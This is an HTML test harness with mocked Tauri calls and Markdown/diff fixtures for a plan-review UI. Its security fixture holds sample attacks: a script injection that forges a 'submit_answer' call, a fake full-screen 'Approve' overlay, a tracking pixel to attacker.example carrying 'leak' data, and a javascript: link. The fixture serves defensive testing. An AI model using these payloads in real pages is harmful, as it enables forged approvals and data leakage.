<!DOCTYPE html>
<html lang="en" style="background:white;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HITL Plan Review — Test Harness</title>
    <link rel="stylesheet" href="review.css">
    <script src="vendor/markdown-it.min.js"></script>
    <script src="vendor/diff.min.js"></script>
    <!-- Mock window.__TAURI__ so nothing here needs a running Rust client.
         Mirrors test-harness.html:10-30. -->
    <script>
        window.__TAURI__ = {
            event: { listen: () => Promise.resolve(() => {}) },
            core: {
                invoke: (cmd, args) => {
                    console.log('[TAURI MOCK] invoke:', cmd, args);
                    window.__lastInvoke = { cmd, args };
                    return Promise.resolve();
                },
            },
            window: {
                getCurrentWindow: () => ({
                    show: () => Promise.resolve(),
                    setFocus: () => Promise.resolve(),
                    close: () => { console.log('[TAURI MOCK] window.close()'); },
                }),
            },
        };
    </script>
</head>
<body style="background:white;">
    <div id="review-container"></div>

    <script type="module">
        import { renderPlanReview, renderReviewPanel } from './review.js';

        // ── fixture builders ────────────────────────────────────────────────
        // A unified diff as `createTwoFilesPatch(..., {context: 999999})` emits
        // it: full context, one hunk, one file.
        function buildDiff(ops, eol = '\n') {
            const oldCount = ops.filter(o => o.type !== '+').length;
            const newCount = ops.filter(o => o.type !== '-').length;
            return [
                '===================================================================',
                '--- plan.md\tprevious',
                '+++ plan.md\tcurrent',
                `@@ -1,${oldCount} +1,${newCount} @@`,
                ...ops.map(o => o.type + o.text),
            ].join(eol);
        }

        function planFixture(contentLines, ops, overrides = {}) {
            return Object.assign({
                type: 'plan_review',
                messageId: 'review-fixture-001',
                protocolVersion: 2,
                repo: { name: 'Hitl_MCP', branch: 'work-item/1-reviewplan' },
                context: 'The agent wants a line-level review before it starts implementing.',
                summary: 'Adds the **ReviewPlan** tool and a two-pane review window.',
                displayPath: 'docs/plan-v1.md',
                planId: 'plan-abc123',
                revision: 2,
                isNewPlan: false,
                snapshotHash: 'sha256:deadbeef',
                body: { content: contentLines.join('\n'), diff: buildDiff(ops) },
            }, overrides);
        }

        // ── fixtures ────────────────────────────────────────────────────────
        function defaultFixture() {
            const lines = [];
            lines.push('# Implementation plan');
            lines.push('');
            for (let i = 3; i <= 60; i++) {
                if (i % 12 === 0) lines.push(`## Section ${i / 12}`);
                else if (i % 7 === 0) lines.push(`- bullet item on line ${i} with \`inline code\``);
                else lines.push(`Paragraph line ${i} of the plan, with **bold** and _italic_ text.`);
            }
            const ops = lines.map((text, i) => ({ type: i === 9 ? '+' : ' ', text }));
            ops.splice(20, 0, { type: '-', text: 'This paragraph was removed in this revision.' });
            return planFixture(lines, ops);
        }

        // G-1: a plan whose text contains a literal backslash-n two-character
        // sequence. normalizeNewlines() would turn it into a real newline and
        // shift every following line number — this fixture proves we do not.
        function literalBackslashNFixture() {
            const lines = [
                '# Escapes',
                'The sequence \\n is a literal backslash followed by n.',
                'This must still be line 3.',
                'And this must still be line 4.',
            ];
            return planFixture(lines, lines.map(text => ({ type: ' ', text })));
        }

        function crlfFixture() {
            const lines = ['# CRLF plan', 'second line', 'third line', 'fourth line'];
            const ops = lines.map(text => ({ type: ' ', text }));
            const msg = planFixture(lines, ops);
            msg.body.content = lines.join('\r\n');
            msg.body.diff = buildDiff(ops, '\r\n');
            return msg;
        }

        function noTrailingNewlineFixture() {
            const lines = ['# No trailing newline', 'line two', 'line three'];
            const ops = lines.map(text => ({ type: ' ', text }));
            ops.push({ type: '\\', text: ' No newline at end of file' });
            const msg = planFixture(lines, ops);
            msg.body.content = lines.join('\n');
            return msg;
        }

        function eofNewlineOnlyFixture() {
            const msg = planFixture(['# Title', 'Paragraph.'], []);
            msg.body.content = '# Title\nParagraph.\n';
            msg.body.diff = [
                '--- plan.md\tprevious',
                '+++ plan.md\tcurrent',
                '@@ -1,2 +1,2 @@',
                ' # Title',
                '-Paragraph.',
                '\\ No newline at end of file',
                '+Paragraph.',
            ].join('\n');
            return msg;
        }

        function blankLineOnlyFixture() {
            const msg = planFixture(['# Title', '', 'Paragraph.'], []);
            msg.body.diff = [
                '--- plan.md\tprevious',
                '+++ plan.md\tcurrent',
                '@@ -1,2 +1,3 @@',
                ' # Title',
                '+',
                ' Paragraph.',
            ].join('\n');
            return msg;
        }

        function addedOnlyFixture() {
            const lines = ['# Plan', '## New section only in the current plan', '## Existing section'];
            return planFixture(lines, [
                { type: ' ', text: lines[0] },
                { type: '+', text: lines[1] },
                { type: ' ', text: lines[2] },
            ]);
        }

        // Task 10: complete Markdown blocks whose rendered selections must map
        // back to their 1-based, inclusive raw-source line ranges. Repeated
        // words and emoji make text-search / UTF-16-offset implementations
        // visibly choose the wrong source block.
        function mappedBlocksFixture() {
            const lines = [
                '# ATX heading',
                '',
                'Setext heading',
                '==============',
                '',
                'Duplicate text 😀 starts this multiline paragraph',
                'and duplicate text finishes it with a [safe link](#safe-target).',
                '',
                '> Quoted duplicate text',
                '>',
                '> - Nested duplicate text',
                '>   - Deep emoji 😀 item',
                '',
                '| Name | Value |',
                '| --- | --- |',
                '| duplicate text | 😀 |',
                '',
                '```js',
                "const emoji = '😀';",
                '```',
                '',
                '## Safe target',
                '',
                '[Jump to target](#safe-target)',
                '',
                'Same 😀 duplicate.',
                '',
                'Same 😀 duplicate.',
            ];
            return planFixture(lines, lines.map(text => ({ type: ' ', text })));
        }

        function partialMappedBlocksFixture() {
            const msg = mappedBlocksFixture();
            msg.body.diff = [
                '--- plan.md\tprevious',
                '+++ plan.md\tcurrent',
                '@@ -1,1 +1,1 @@',
                ' # ATX heading',
            ].join('\n');
            return msg;
        }

        function sourceOnlyChangesFixture() {
            const newLines = [
                '# Silent source changes',
                '',
                '[same link](https://new.example/path)',
                '',
                '_same emphasis_',
                '',
                '* same list item',
                '',
                '| Name | Value |',
                '| ---: | :--- |',
                '| same | cells |',
                '',
                '<div class="new">same raw HTML</div>',
                '',
                '[same reference][target]',
                '',
                '[target]: https://new.example/reference',
            ];
            const ops = [
                { type: ' ', text: '# Silent source changes' },
                { type: ' ', text: '' },
                { type: '-', text: '[same link](https://old.example/path)' },
                { type: '+', text: newLines[2] },
                { type: ' ', text: '' },
                { type: '-', text: '*same emphasis*' },
                { type: '+', text: newLines[4] },
                { type: ' ', text: '' },
                { type: '-', text: '- same list item' },
                { type: '+', text: newLines[6] },
                { type: ' ', text: '' },
                { type: ' ', text: '| Name | Value |' },
                { type: '-', text: '| :--- | ---: |' },
                { type: '+', text: newLines[9] },
                { type: ' ', text: '| same | cells |' },
                { type: ' ', text: '' },
                { type: '-', text: '<div class="old">same raw HTML</div>' },
                { type: '+', text: newLines[12] },
                { type: ' ', text: '' },
                { type: ' ', text: '[same reference][target]' },
                { type: ' ', text: '' },
                { type: '-', text: '[target]: https://old.example/reference' },
                { type: '+', text: newLines[16] },
            ];
            return planFixture(newLines, ops);
        }

        function longBlocksFixture() {
            const newLines = [];
            const ops = [];
            for (let i = 1; i <= 24; i++) {
                const current = `## Section ${i}`;
                newLines.push(current, '', `Paragraph ${i}.`);
                if (i === 13) {
                    ops.push({ type: '-', text: '## Original section 13' }, { type: '+', text: current });
                } else {
                    ops.push({ type: ' ', text: current });
                }
                ops.push({ type: ' ', text: '' }, { type: ' ', text: `Paragraph ${i}.` });
                if (i < 24) {
                    newLines.push('');
                    ops.push({ type: ' ', text: '' });
                }
            }
            return planFixture(newLines, ops);
        }

        // F-5/F-6/F-7: every UI-spoof rung in one plan.
        function securityFixture() {
            const lines = [
                '# Security fixture',
                // The closing tag is written `<\/script>`: an unescaped literal
                // would end this inline module in the HTML parser.
                '<script>window.__xssFired = true; window.__TAURI__.core.invoke("submit_answer", {forged: true});<\/script>',
                '<div style="position:fixed;inset:0;z-index:9999;background:#fff" id="spoof-overlay">FAKE UI — Approve</div>',
                '![tracking pixel](https://attacker.example/pixel.png?d=leak)',
                '[a link](javascript:window.__jsUriFired=true)',
                'Normal trailing paragraph.',
            ];
            return planFixture(lines, lines.map(text => ({ type: ' ', text })));
        }

        // Sender-identity badge fixture: carries a `sender` field the way
        // Task 5's `handleReviewPlan` populates it on the wire.
        function senderBadgeFixture() {
            const lines = ['# Implementation plan', '', 'A short plan to exercise the sender badge.'];
            const ops = lines.map(text => ({ type: ' ', text }));
            return planFixture(lines, ops, {
                sender: { label: 'Kay9 - work-item/1-reviewplan', source: 'worktree' },
            });
        }

        // W3.6 measurement fixture: a real ~100 KB plan.
        function largeFixture() {
            const lines = [];
            let bytes = 0;
            let i = 0;
            while (bytes < 100 * 1024) {
                i++;
                let line;
                if (i % 25 === 0) line = `## Section ${i / 25}`;
                else if (i % 11 === 0) line = `- item ${i}: \`some.identifier(${i})\` and a note about behaviour`;
                else line = `Line ${i}: a fairly typical sentence of plan prose describing step ${i} in reasonable detail.`;
                lines.push(line);
                bytes += line.length + 1;
            }
            const msg = planFixture(lines, lines.map(text => ({ type: ' ', text })));
            msg.displayPath = 'docs/large-plan.md';
            return msg;
        }

        function formattedPerformanceFixture(lineCount, allChanged = false) {
            const newLines = [];
            const ops = [];
            for (let line = 1; line <= lineCount; line++) {
                const current = line % 4 === 1 ? `## Section ${Math.ceil(line / 4)}`
                    : line % 4 === 2 ? '' : `Plan prose on line ${line}.`;
                newLines.push(current);
                if (allChanged && current) {
                    ops.push({ type: '-', text: `Previous prose on line ${line}.` });
                    ops.push({ type: '+', text: current });
                } else {
                    ops.push({ type: ' ', text: current });
                }
            }
            return planFixture(newLines, ops);
        }

        const fixtures = {
            default: defaultFixture,
            'literal-backslash-n': literalBackslashNFixture,
            crlf: crlfFixture,
            'no-trailing-newline': noTrailingNewlineFixture,
            'eof-newline-only': eofNewlineOnlyFixture,
            'blank-line-only': blankLineOnlyFixture,
            'added-only': addedOnlyFixture,
            'mapped-blocks': mappedBlocksFixture,
            'partial-mapped-blocks': partialMappedBlocksFixture,
            'source-only-changes': sourceOnlyChangesFixture,
            'long-blocks': longBlocksFixture,
            security: securityFixture,
            large: largeFixture,
            'formatted-1k': () => formattedPerformanceFixture(1_000),
            'formatted-10k': () => formattedPerformanceFixture(10_000),
            'formatted-all-changed': () => formattedPerformanceFixture(1_000, true),
            'formatted-all-changed-10k': () => formattedPerformanceFixture(10_000, true),
            'sender-badge': senderBadgeFixture,
        };

        // ── wiring ──────────────────────────────────────────────────────────
        const params = new URLSearchParams(window.location.search);
        const hash = window.location.hash.replace('#', '');
        const name = params.get('fixture') || hash || 'default';
        const state = params.get('state');
        const failSubmit = params.get('fail') === '1';
        // submit_plan_review resolves with {status, responseId, reason}; only
        // 'received' is success. ?status= drives the others, and an empty
        // ?status= drops the field entirely to exercise the fail-safe default.
        const submitStatus = params.has('status') ? params.get('status') : 'received';
        const submitResult = {
            responseId: 'resp-test',
            reason: submitStatus === 'lost' ? 'response attachment expired'
                : submitStatus === 'unacknowledged' ? 'no ack within 30s' : null,
        };
        if (submitStatus) submitResult.status = submitStatus;

        const container = document.getElementById('review-container');

        if (state) {
            renderReviewPanel(container, {
                kind: state,
                have: params.get('have') || 2,
                need: params.get('need') || 3,
                displayPath: 'docs/plan-v1.md',
            });
        } else {
            const message = (fixtures[name] || fixtures.default)();
            window.__fixture = message;

            const controller = renderPlanReview(container, message, {
                formattedDiffBounds: params.get('diffFallback') === '1'
                    ? { maxEditLength: 0, timeout: 1 }
                    : params.has('diffMax')
                        ? { maxEditLength: Number(params.get('diffMax')), timeout: 50 }
                        : undefined,
                onSubmit: async (payload) => {
                    console.log('[TEST] onSubmit:', payload);
                    if (failSubmit) throw new Error('ntfy publish failed (simulated)');
                    window.__lastSubmit = payload;
                    return submitResult;
                },
                onSkip: async () => {
                    console.log('[TEST] onSkip');
                    if (failSubmit) throw new Error('ntfy publish failed (simulated)');
                    window.__lastSkip = true;
                    return submitResult;
                },
                onDraftChange: (draft) => { window.__lastDraft = draft; },
            });

            window.__review = controller;
            // Event simulators, so the post-first-paint states are exercisable
            // without a running Rust client.
            window.__simulateSuperseded = (device) => controller.setSuperseded(device);
            window.__simulateCancelled = (reason) => controller.setCancelled(reason);
        }
    </script>
</body>
</html>
